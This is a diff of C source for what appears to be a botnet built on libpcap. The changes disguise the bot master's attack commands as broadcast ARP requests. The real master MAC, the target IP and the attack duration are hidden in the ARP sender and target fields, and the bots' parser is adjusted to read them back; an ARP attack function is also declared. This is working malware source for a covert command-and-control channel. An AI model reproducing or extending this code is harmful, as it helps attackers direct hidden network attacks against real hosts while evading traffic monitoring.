@@ -67,8 +67,8 @@ void print_availiable()
 
 void extract_attack_info(const u_char *package, u_char *target_ip, u_char *attack_time)
 {
-    memcpy(target_ip, package+14, 4);
-    memcpy(attack_time, package+18, 4);
+    memcpy(target_ip, package+28, 4);
+    memcpy(attack_time, package+38, 4);
 }
 
 _Bool is_bot_command(const u_char *package)
@@ -77,10 +77,11 @@ _Bool is_bot_command(const u_char *package)
     for(int i=0; i<6; i++)
         result &= package[i] == broadcast_mac[i];
     
-    for(int i=6; i<12; i++)
-        result &= package[i] == bot_master_mac[i-6];
+    for(int i=22; i<28; i++)
+        result &= package[i] == bot_master_mac[i-22];
     
-    return result && package[12] == *((u_char*)(&bot_ethertype) + 1) && package[13] == *((u_char*)(&bot_ethertype) + 0);
+    return result;
+    //return result && package[12] == *((u_char*)(&bot_ethertype) + 1) && package[13] == *((u_char*)(&bot_ethertype) + 0);
 }
 
 void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *bytes)
@@ -117,7 +118,7 @@ void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *byt
     }
 }
 
-void create_bot_command(const u_char target_ip[4], int attack_time, u_char* package)
+void create_bot_command(const u_char target_ip[4], int attack_time, u_char real_mac[6], u_char* package)
 {
     // broadcast destination
     for(int i=0; i<6; i++)
@@ -125,25 +126,69 @@ void create_bot_command(const u_char target_ip[4], int attack_time, u_char* pack
     
     //source address
     for(int i=6; i<12; i++)
-        package[i] = bot_master_mac[i-6];
+        package[i] = real_mac[i-6];
 
     //ethertype
     package[12] = *((u_char*)(&bot_ethertype) + 1);
     package[13] = *((u_char*)(&bot_ethertype) + 0);
     
-    //target ip
-    memcpy(package + 14, target_ip, 4);
-    
-    //attack time
-    for(int i=0; i<4; i++)
-        package[18+i] = *((u_char*)(&attack_time) + 3-i);
-    
-    //padding
-    for(int i=22; i<63; i++)
+    // htype
+    package[14] = 0;
+    package[15] = 1;
+
+    // ptype
+    package[16] = 8;
+    package[17] = 0;
+
+    // hsize
+    package[18] = 6;
+
+    // ptype
+    package[19] = 4;
+
+    // opcode - request
+    package[20] = 0;
+    package[21] = 1;
+
+    // sha - hiding bot_master_mac 
+    for(int i=22; i < 28; i++)
+        package[i] = bot_master_mac[i-22];
+
+    // spa - target_ip
+    memcpy(package + 28, target_ip, 4);
+
+    // tha
+    for(int i=32; i < 38; i++)
         package[i] = 0;
     
+    // tpa - attack_time
+    for(int i=0; i<4; i++)
+        package[38+i] = *((u_char*)(&attack_time) + 3-i);
+    
+    //padding
+    //for(int i=22; i<63; i++)
+    //    package[i] = 0;
+    
     // FCS calculation
-    // todo
+    /*uint32_t fcs = 0;
+    for(int i=14; i<22; i+=2)
+    {
+        uint16_t block = 0;
+        *((u_char*)&block + 1) = package[i];
+        *((u_char*)&block + 0) = package[i+1];
+        fcs += block;
+    }
+    if(fcs > 65535)
+    {
+        *((uint16_t*)&fcs + 1) = 0;
+        fcs++;
+    }
+    fcs = ~fcs;
+
+    for(int i=62; i<64; i++)
+        package[i] = *((u_char*)&fcs + 63 - i);
+
+    printf("FCS for this package: %x\n", fcs);*/
 }
 
 void create_arp_attack(const u_char target_ip[4], const u_char sha[6], const u_char spa[4], u_char* package)
